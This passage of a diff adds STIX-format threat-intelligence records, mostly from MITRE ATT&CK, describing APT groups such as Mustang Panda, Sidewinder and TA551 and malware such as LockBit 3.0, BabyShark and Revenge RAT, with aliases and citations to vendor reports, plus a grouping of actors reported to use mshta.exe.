+          "description": "Mele, G. et al. (2021, February 10). Probable Iranian Cyber Actors, Static Kitten, Conducting Cyberespionage Campaign Targeting UAE and Kuwait Government Agencies. Retrieved March 17, 2021.",
+          "url": "https://www.anomali.com/blog/probable-iranian-cyber-actors-static-kitten-conducting-cyberespionage-campaign-targeting-uae-and-kuwait-government-agencies"
+        },
+        {
+          "source_name": "Trend Micro Muddy Water March 2021",
+          "description": "Peretz, A. and Theck, E. (2021, March 5). Earth Vetala – MuddyWater Continues to Target Organizations in the Middle East. Retrieved March 18, 2021.",
+          "url": "https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html"
+        },
+        {
+          "source_name": "Reaqta MuddyWater November 2017",
+          "description": "Reaqta. (2017, November 22). A dive into MuddyWater APT targeting Middle-East. Retrieved May 18, 2020.",
+          "url": "https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/"
+        },
+        {
+          "source_name": "FireEye MuddyWater Mar 2018",
+          "description": "Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018.",
+          "url": "https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html"
+        },
+        {
+          "source_name": "Symantec MuddyWater Dec 2018",
+          "description": "Symantec DeepSight Adversary Intelligence Team. (2018, December 10). Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms. Retrieved December 14, 2018.",
+          "url": "https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-22T22:01:13.781Z",
+      "name": "Mustang Panda",
+      "description": "[Mustang Panda](https://attack.mitre.org/groups/G0129) is a China-based cyber espionage threat actor that was first observed in 2017 but may have been conducting operations since at least 2014. [Mustang Panda](https://attack.mitre.org/groups/G0129) has targeted government entities, nonprofits, religious, and other non-governmental organizations in the U.S., Europe, Mongolia, Myanmar, Pakistan, and Vietnam, among others.(Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019) ",
+      "aliases": [
+        "Mustang Panda",
+        "TA416",
+        "RedDelta",
+        "BRONZE PRESIDENT"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "2.1",
+      "x_mitre_contributors": [
+        "Kyaw Pyiyt Htet, @KyawPyiytHtet"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--420ac20b-f2b9-42b8-aa1a-6d4b72895ca4",
+      "created": "2021-04-12T15:56:28.861Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0129",
+          "external_id": "G0129"
+        },
+        {
+          "source_name": "Mustang Panda",
+          "description": "(Citation: Crowdstrike MUSTANG PANDA June 2018)"
+        },
+        {
+          "source_name": "TA416",
+          "description": "(Citation: Proofpoint TA416 November 2020)"
+        },
+        {
+          "source_name": "RedDelta",
+          "description": "(Citation: Recorded Future REDDELTA July 2020)(Citation: Proofpoint TA416 Europe March 2022)"
+        },
+        {
+          "source_name": "BRONZE PRESIDENT",
+          "description": "(Citation: Secureworks BRONZE PRESIDENT December 2019)"
+        },
+        {
+          "source_name": "Anomali MUSTANG PANDA October 2019",
+          "description": "Anomali Threat Research. (2019, October 7). China-Based APT Mustang Panda Targets Minority Groups, Public and Private Sector Organizations. Retrieved April 12, 2021.",
+          "url": "https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations"
+        },
+        {
+          "source_name": "Secureworks BRONZE PRESIDENT December 2019",
+          "description": "Counter Threat Unit Research Team. (2019, December 29). BRONZE PRESIDENT Targets NGOs. Retrieved April 13, 2021.",
+          "url": "https://www.secureworks.com/research/bronze-president-targets-ngos"
+        },
+        {
+          "source_name": "Recorded Future REDDELTA July 2020",
+          "description": "Insikt Group. (2020, July 28). CHINESE STATE-SPONSORED GROUP ‘REDDELTA’ TARGETS THE VATICAN AND CATHOLIC ORGANIZATIONS. Retrieved April 13, 2021.",
+          "url": "https://go.recordedfuture.com/hubfs/reports/cta-2020-0728.pdf"
+        },
+        {
+          "source_name": "Crowdstrike MUSTANG PANDA June 2018",
+          "description": "Meyers, A. (2018, June 15). Meet CrowdStrike’s Adversary of the Month for June: MUSTANG PANDA. Retrieved April 12, 2021.",
+          "url": "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-june-mustang-panda/"
+        },
+        {
+          "source_name": "Proofpoint TA416 November 2020",
+          "description": "Proofpoint Threat Research Team. (2020, November 23). TA416 Goes to Ground and Returns with a Golang PlugX Malware Loader. Retrieved April 13, 2021.",
+          "url": "https://www.proofpoint.com/us/blog/threat-insight/ta416-goes-ground-and-returns-golang-plugx-malware-loader"
+        },
+        {
+          "source_name": "Proofpoint TA416 Europe March 2022",
+          "description": "Raggi, M. et al. (2022, March 7). The Good, the Bad, and the Web Bug: TA416 Increases Operational Tempo Against European Governments as Conflict in Ukraine Escalates. Retrieved March 16, 2022.",
+          "url": "https://www.proofpoint.com/us/blog/threat-insight/good-bad-and-web-bug-ta416-increases-operational-tempo-against-european"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2022-10-24T18:51:09.213Z",
+      "name": "SideCopy",
+      "description": "[SideCopy](https://attack.mitre.org/groups/G1008) is a Pakistani threat group that has primarily targeted South Asian countries, including Indian and Afghani government personnel, since at least 2019. [SideCopy](https://attack.mitre.org/groups/G1008)'s name comes from its infection chain that tries to mimic that of [Sidewinder](https://attack.mitre.org/groups/G0121), a suspected Indian threat group.(Citation: MalwareBytes SideCopy Dec 2021)",
+      "aliases": [
+        "SideCopy"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "1.0",
+      "x_mitre_contributors": [
+        "Pooja Natarajan, NEC Corporation India",
+        "Hiroki Nagahama, NEC Corporation",
+        "Manikantan Srinivasan, NEC Corporation India"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--03be849d-b5a2-4766-9dda-48976bae5710",
+      "created": "2022-08-07T13:52:07.791Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G1008",
+          "external_id": "G1008"
+        },
+        {
+          "source_name": "MalwareBytes SideCopy Dec 2021",
+          "description": "Threat Intelligence Team. (2021, December 2). SideCopy APT: Connecting lures victims, payloads to infrastructure. Retrieved June 13, 2022.",
+          "url": "https://www.malwarebytes.com/blog/news/2021/12/sidecopy-apt-connecting-lures-to-victims-payloads-to-infrastructure"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.0.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-22T05:31:54.382Z",
+      "name": "Sidewinder",
+      "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) is a suspected Indian threat actor group that has been active since at least 2012. They have been observed targeting government, military, and business entities throughout Asia, primarily focusing on Pakistan, China, Nepal, and Afghanistan.(Citation: ATT Sidewinder January 2021)(Citation: Securelist APT Trends April 2018)(Citation: Cyble Sidewinder September 2020)",
+      "aliases": [
+        "Sidewinder",
+        "T-APT-04",
+        "Rattlesnake"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "1.1",
+      "x_mitre_contributors": [
+        "Lacework Labs",
+        "Daniyal Naeem, BT Security"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+      "created": "2021-01-27T15:57:11.183Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0121",
+          "external_id": "G0121"
+        },
+        {
+          "source_name": "T-APT-04",
+          "description": "(Citation: Cyble Sidewinder September 2020)"
+        },
+        {
+          "source_name": "Rattlesnake",
+          "description": "(Citation: Cyble Sidewinder September 2020)"
+        },
+        {
+          "source_name": "Cyble Sidewinder September 2020",
+          "description": "Cyble. (2020, September 26). SideWinder APT Targets with futuristic Tactics and Techniques. Retrieved January 29, 2021.",
+          "url": "https://cybleinc.com/2020/09/26/sidewinder-apt-targets-with-futuristic-tactics-and-techniques/"
+        },
+        {
+          "source_name": "Securelist APT Trends April 2018",
+          "description": "Global Research and Analysis Team . (2018, April 12). APT Trends report Q1 2018. Retrieved January 27, 2021.",
+          "url": "https://securelist.com/apt-trends-report-q1-2018/85280/"
+        },
+        {
+          "source_name": "ATT Sidewinder January 2021",
+          "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+          "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-22T05:40:21.255Z",
+      "name": "TA551",
+      "description": "[TA551](https://attack.mitre.org/groups/G0127) is a financially-motivated threat group that has been active since at least 2018. (Citation: Secureworks GOLD CABIN) The group has primarily targeted English, German, Italian, and Japanese speakers through email-based malware distribution campaigns. (Citation: Unit 42 TA551 Jan 2021)",
+      "aliases": [
+        "TA551",
+        "GOLD CABIN",
+        "Shathak"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "1.2",
+      "x_mitre_contributors": [
+        "Shuhei Sasada, Cyber Defense Institute, Inc",
+        "Ryo Tamura, SecureBrain Corporation",
+        "Shotaro Hamamoto, NEC Solution Innovators, Ltd",
+        "Yusuke Niwa, ITOCHU Corporation",
+        "Takuma Matsumoto, LAC Co., Ltd"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+      "created": "2021-03-19T21:04:00.692Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0127",
+          "external_id": "G0127"
+        },
+        {
+          "source_name": "GOLD CABIN",
+          "description": "(Citation: Secureworks GOLD CABIN)"
+        },
+        {
+          "source_name": "Shathak",
+          "description": "(Citation: Unit 42 Valak July 2020)(Citation: Unit 42 TA551 Jan 2021)"
+        },
+        {
+          "source_name": "Unit 42 Valak July 2020",
+          "description": "Duncan, B. (2020, July 24). Evolution of Valak, from Its Beginnings to Mass Distribution. Retrieved August 31, 2020.",
+          "url": "https://unit42.paloaltonetworks.com/valak-evolution/"
+        },
+        {
+          "source_name": "Unit 42 TA551 Jan 2021",
+          "description": "Duncan, B. (2021, January 7). TA551: Email Attack Campaign Switches from Valak to IcedID. Retrieved March 17, 2021.",
+          "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/"
+        },
+        {
+          "source_name": "Secureworks GOLD CABIN",
+          "description": "Secureworks. (n.d.). GOLD CABIN Threat Profile. Retrieved March 17, 2021.",
+          "url": "https://www.secureworks.com/research/threat-profiles/gold-cabin"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "Associated APTs",
+      "description": "APTs been observed using LOLBin tool Mshta.exe",
+      "id": "grouping--073e5f07-c0e2-4945-8b4a-1d0e8a33f381",
+      "type": "grouping",
+      "spec_version": 2.1,
+      "created": "2023-09-05T23:23:32+01:00",
+      "modified": "2023-09-05T23:23:32+01:00",
+      "context": "suspicious-activity",
+      "object_refs": [
+        "intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542",
+        "intrusion-set--247cb30b-955f-42eb-97a5-a89fef69341e",
+        "intrusion-set--6eded342-33e5-4451-b6b2-e1c62863129f",
+        "intrusion-set--cc613a49-9bfa-4e22-98d1-15ffbb03f034",
+        "intrusion-set--3753cc21-2dae-4dfb-8481-d004e74502cc",
+        "intrusion-set--2e290bfe-93b5-48ce-97d6-edcd6d32b7cf",
+        "intrusion-set--ead23196-d7b6-4ce6-a124-4ab4b67d81bd",
+        "intrusion-set--0ec2f388-bf0f-4b5c-97b1-fc736d26c25f",
+        "intrusion-set--c93fccb1-e8e8-42cf-ae33-2ad1d183913a",
+        "intrusion-set--abc5a1d4-f0dc-49d1-88a1-4a80e478bb03",
+        "intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2",
+        "intrusion-set--420ac20b-f2b9-42b8-aa1a-6d4b72895ca4",
+        "intrusion-set--03be849d-b5a2-4766-9dda-48976bae5710",
+        "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+        "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182"
+      ]
+    },
+    {
+      "source_ref": "grouping--073e5f07-c0e2-4945-8b4a-1d0e8a33f381",
+      "target_ref": "tool--577a8da2-77cf-490c-8f92-55976b5c3116",
+      "relationship_type": "uses",
+      "type": "relationship",
+      "created": "2023-08-20T18:53:57.511Z",
+      "modified": "2023-08-20T18:53:57.511Z",
+      "id": "relationship--d0702e54-4c60-47de-b8bf-b544e7a8346f",
+      "targetObjectType": "grouping"
+    },
+    {
+      "modified": "2021-03-12T17:26:12.324Z",
+      "name": "BabyShark",
+      "description": "[BabyShark](https://attack.mitre.org/software/S0414) is a Microsoft Visual Basic (VB) script-based malware family that is believed to be associated with several North Korean campaigns. (Citation: Unit42 BabyShark Feb 2019)",
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_aliases": [
+        "BabyShark"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "malware--d1b7830a-fced-4be3-a99c-f495af9d9e1b",
+      "type": "malware",
+      "created": "2019-10-07T19:05:48.886Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "external_id": "S0414",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0414"
+        },
+        {
+          "source_name": "BabyShark",
+          "description": "(Citation: Unit42 BabyShark Feb 2019)(Citation: Unit42 BabyShark Apr 2019)"
+        },
+        {
+          "description": "Unit 42. (2019, February 22). New BabyShark Malware Targets U.S. National Security Think Tanks. Retrieved October 7, 2019.",
+          "url": "https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/",
+          "source_name": "Unit42 BabyShark Feb 2019"
+        },
+        {
+          "description": "Lim, M.. (2019, April 26). BabyShark Malware Part Two – Attacks Continue Using KimJongRAT and PCRat . Retrieved October 7, 2019.",
+          "url": "https://unit42.paloaltonetworks.com/babyshark-malware-part-two-attacks-continue-using-kimjongrat-and-pcrat/",
+          "source_name": "Unit42 BabyShark Apr 2019"
+        }
+      ],
+      "x_mitre_version": "1.2",
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "LockBit 3.0",
+      "description": "Defense Evasion: The LockBit 3.0 executable has been executed as a .hta file via mshta.exe.[LogPoint Hunting LockBit].\nRansomware labeled “LockBit” was first observed in 2020, and since that time, the LockBit group and its affiliates have carried out a very large number of attacks involving a wide range of victims around the world.[U.S. CISA Understanding LockBit June 2023]\n\nLockBit developers have introduced multiple versions of the LockBit encryption tool. According to the U.S. Cybersecurity and Infrastructure Security Agency (“CISA”), the following major LockBit variants have been observed (first-observed dates in parentheses): ABCD (LockBit malware’s predecessor; September 2019), LockBit (January 2020), LockBit 2.0 (June 2021), LockBit Linux-ESXi Locker (October 2021), LockBit 3.0 (September 2022), LockBit Green (a variant that incorporates source code from Conti ransomware; January 2023), and variants capable of targeting macOS environments (April 2023). As of June 2023, CISA reported that the web panel that offers affiliates access to LockBit malware explicitly listed the LockBit 2.0, LockBit 3.0, LockBit Green, and LockBit Linux-ESXi Locker variants.[U.S. CISA Understanding LockBit June 2023] According to CISA, LockBit 3.0 (also known as “LockBit Black”) shares code similarities with Blackmatter and BlackCat ransomware and is “more modular and evasive\" than previous LockBit strains.[U.S. CISA LockBit 3.0 March 2023]",
+      "id": "malware--c151b1f5-d3ae-4490-97db-7efc2ec8d31c",
+      "type": "malware",
+      "spec_version": 2.1,
+      "created_by_ref": "identity--e513d1ca-5393-4b4f-b136-9c151bc28085",
+      "created": "2023-09-14T14:46:36+01:00",
+      "modified": "2023-09-14T14:46:36+01:00",
+      "revoked": false,
+      "first_seen": "2023-09-14T14:46:36+01:00",
+      "last_seen": "2023-09-14T14:46:36+01:00",
+      "malware_types": [
+        "ransomware"
+      ]
+    },
+    {
+      "modified": "2022-10-18T23:23:55.295Z",
+      "name": "Metamorfo",
+      "description": "[Metamorfo](https://attack.mitre.org/software/S0455) is a Latin-American banking trojan operated by a Brazilian cybercrime group that has been active since at least April 2018. The group focuses on targeting banks and cryptocurrency services in Brazil and Mexico.(Citation: Medium Metamorfo Apr 2020)(Citation: ESET Casbaneiro Oct 2019) ",
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_version": "2.0",
+      "x_mitre_contributors": [
+        "Jose Luis Sánchez Martinez",
+        "Chen Erlich, @chen_erlich, enSilo"
+      ],
+      "x_mitre_aliases": [
+        "Metamorfo",
+        "Casbaneiro"
+      ],
+      "type": "malware",
+      "id": "malware--81c57a96-fc8c-4f91-af8e-63e24c2927c2",
+      "created": "2020-05-26T17:34:19.044Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0455",
+          "external_id": "S0455"
+        },
+        {
+          "source_name": "Casbaneiro",
+          "description": "(Citation: ESET Casbaneiro Oct 2019)"
+        },
+        {
+          "source_name": "Metamorfo",
+          "description": "(Citation: Medium Metamorfo Apr 2020)(Citation: ESET Casbaneiro Oct 2019) "
+        },
+        {
+          "source_name": "Medium Metamorfo Apr 2020",
+          "description": "Erlich, C. (2020, April 3). The Avast Abuser: Metamorfo Banking Malware Hides By Abusing Avast Executable. Retrieved May 26, 2020.",
+          "url": "https://medium.com/@chenerlich/the-avast-abuser-metamorfo-banking-malware-hides-by-abusing-avast-executable-ac9b8b392767"
+        },
+        {
+          "source_name": "ESET Casbaneiro Oct 2019",
+          "description": "ESET Research. (2019, October 3). Casbaneiro: peculiarities of this banking Trojan that affects Brazil and Mexico. Retrieved September 23, 2021.",
+          "url": "https://www.welivesecurity.com/2019/10/03/casbaneiro-trojan-dangerous-cooking/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "NanHaiShu",
+      "description": "[NanHaiShu](https://attack.mitre.org/software/S0228) is a remote access tool and JScript backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065). [NanHaiShu](https://attack.mitre.org/software/S0228) has been used to target government and private-sector organizations that have relations to the South China Sea dispute. (Citation: Proofpoint Leviathan Oct 2017) (Citation: fsecure NanHaiShu July 2016)",
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_aliases": [
+        "NanHaiShu"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "malware--705f0783-5f7d-4491-b6b7-9628e6e006d2",
+      "type": "malware",
+      "created": "2018-04-18T17:59:24.739Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0228",
+          "external_id": "S0228"
+        },
+        {
+          "source_name": "NanHaiShu",
+          "description": "(Citation: Proofpoint Leviathan Oct 2017)"
+        },
+        {
+          "url": "https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets",
+          "description": "Axel F, Pierre T. (2017, October 16). Leviathan: Espionage actor spearphishes maritime and defense targets. Retrieved February 15, 2018.",
+          "source_name": "Proofpoint Leviathan Oct 2017"
+        },
+        {
+          "url": "https://www.f-secure.com/documents/996508/1030745/nanhaishu_whitepaper.pdf",
+          "description": "F-Secure Labs. (2016, July). NANHAISHU RATing the South China Sea. Retrieved July 6, 2018.",
+          "source_name": "fsecure NanHaiShu July 2016"
+        }
+      ],
+      "modified": "2020-06-23T20:05:03.169Z",
+      "x_mitre_version": "1.1",
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-22T05:13:46.664Z",
+      "name": "POWERSTATS",
+      "description": "[POWERSTATS](https://attack.mitre.org/software/S0223) is a PowerShell-based first stage backdoor used by [MuddyWater](https://attack.mitre.org/groups/G0069). (Citation: Unit 42 MuddyWater Nov 2017)",
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_version": "2.3",
+      "x_mitre_aliases": [
+        "POWERSTATS",
+        "Powermud"
+      ],
+      "type": "malware",
+      "id": "malware--e8545794-b98c-492b-a5b3-4b5a02682e37",
+      "created": "2018-04-18T17:59:24.739Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0223",
+          "external_id": "S0223"
+        },
+        {
+          "source_name": "Powermud",
+          "description": "(Citation: Symantec MuddyWater Dec 2018)"
+        },
+        {
+          "source_name": "POWERSTATS",
+          "description": "(Citation: Unit 42 MuddyWater Nov 2017)(Citation: ClearSky MuddyWater Nov 2018)"
+        },
+        {
+          "source_name": "ClearSky MuddyWater Nov 2018",
+          "description": "ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018.",
+          "url": "https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf"
+        },
+        {
+          "source_name": "Unit 42 MuddyWater Nov 2017",
+          "description": "Lancaster, T.. (2017, November 14). Muddying the Water: Targeted Attacks in the Middle East. Retrieved March 15, 2018.",
+          "url": "https://researchcenter.paloaltonetworks.com/2017/11/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/"
+        },
+        {
+          "source_name": "Symantec MuddyWater Dec 2018",
+          "description": "Symantec DeepSight Adversary Intelligence Team. (2018, December 10). Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms. Retrieved December 14, 2018.",
+          "url": "https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "Pteranodon",
+      "description": "[Pteranodon](https://attack.mitre.org/software/S0147) is a custom backdoor used by [Gamaredon Group](https://attack.mitre.org/groups/G0047). (Citation: Palo Alto Gamaredon Feb 2017)",
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_aliases": [
+        "Pteranodon",
+        "Pterodo"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "type": "malware",
+      "id": "malware--5f9f7648-04ba-4a9f-bb4c-2a13e74572bd",
+      "created": "2017-05-31T21:33:26.084Z",
+      "x_mitre_version": "2.1",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "S0147",
+          "url": "https://attack.mitre.org/software/S0147"
+        },
+        {
+          "source_name": "Pterodo",
+          "description": "(Citation: Symantec Shuckworm January 2022)(Citation: Secureworks IRON TILDEN Profile)"
+        },
+        {
+          "source_name": "Palo Alto Gamaredon Feb 2017",
+          "url": "https://researchcenter.paloaltonetworks.com/2017/02/unit-42-title-gamaredon-group-toolset-evolution/",
+          "description": "Kasza, A. and Reichel, D. (2017, February 27). The Gamaredon Group Toolset Evolution. Retrieved March 1, 2017."
+        },
+        {
+          "source_name": "Secureworks IRON TILDEN Profile",
+          "url": "https://www.secureworks.com/research/threat-profiles/iron-tilden",
+          "description": "Secureworks CTU. (n.d.). IRON TILDEN. Retrieved February 24, 2022."
+        },
+        {
+          "source_name": "Symantec Shuckworm January 2022",
+          "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine",
+          "description": "Symantec. (2022, January 31). Shuckworm Continues Cyber-Espionage Attacks Against Ukraine. Retrieved February 17, 2022."
+        }
+      ],
+      "x_mitre_deprecated": false,
+      "revoked": false,
+      "modified": "2022-08-23T15:25:11.145Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "Revenge RAT",
+      "description": "[Revenge RAT](https://attack.mitre.org/software/S0379) is a freely available remote access tool written in .NET (C#).(Citation: Cylance Shaheen Nov 2018)(Citation: Cofense RevengeRAT Feb 2019)",
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_aliases": [
+        "Revenge RAT"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "malware--bdb27a1d-1844-42f1-a0c0-826027ae0326",
+      "type": "malware",
+      "created": "2019-05-02T01:07:36.780Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "external_id": "S0379",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0379"
+        },
+        {
+          "description": "Livelli, K, et al. (2018, November 12). Operation Shaheen. Retrieved May 1, 2019.",
+          "url": "https://www.cylance.com/content/dam/cylance-web/en-us/resources/knowledge-center/resource-library/reports/WhiteCompanyOperationShaheenReport.pdf?_ga=2.161661948.1943296560.1555683782-1066572390.1555511517",
+          "source_name": "Cylance Shaheen Nov 2018"
+        },
+        {
+          "source_name": "Cofense RevengeRAT Feb 2019",
+          "url": "https://cofense.com/upgrades-delivery-support-infrastructure-revenge-rat-malware-bigger-threat/",
+          "description": "Gannon, M. (2019, February 11). With Upgrades in Delivery and Support Infrastructure, Revenge RAT Malware is a Bigger Threat. Retrieved May 1, 2019."
+        }
+      ],
+      "modified": "2020-03-30T18:05:10.885Z",
+      "x_mitre_version": "1.1",
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-27T19:54:34.154Z",
+      "name": "Sibot",
